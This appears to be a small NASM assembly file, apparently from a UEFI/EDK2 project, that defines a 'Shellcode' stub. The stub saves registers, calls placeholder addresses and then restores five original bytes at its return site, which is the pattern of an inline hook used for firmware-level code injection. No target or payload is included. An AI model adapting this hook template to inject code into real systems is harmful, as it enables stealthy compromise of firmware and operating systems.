DEFAULT REL
SECTION .text

global ASM_PFX(Shellcode)
ASM_PFX(Shellcode):
    push rdi
    push rsi
    push rax
    push rcx
    
    mov rdi, 0x6969696969696969
    mov rax, 0x6969696969696969
    call rax                
    mov rdi, 0x6969696969696969
    call rax

    mov rdi, [rsp + 0x20]         ; Load return address (original RIP)
    sub rdi, 5                    ; Adjust to start of overwritten instruction

    mov eax, 0x69696969                     ; original first 4 bytes
    mov [rdi], eax

    mov al, 0x69                            ; original 5th byte
    mov [rdi+4], al
    
    pop rcx
    pop rax
    pop rsi
    pop rdi

    ret
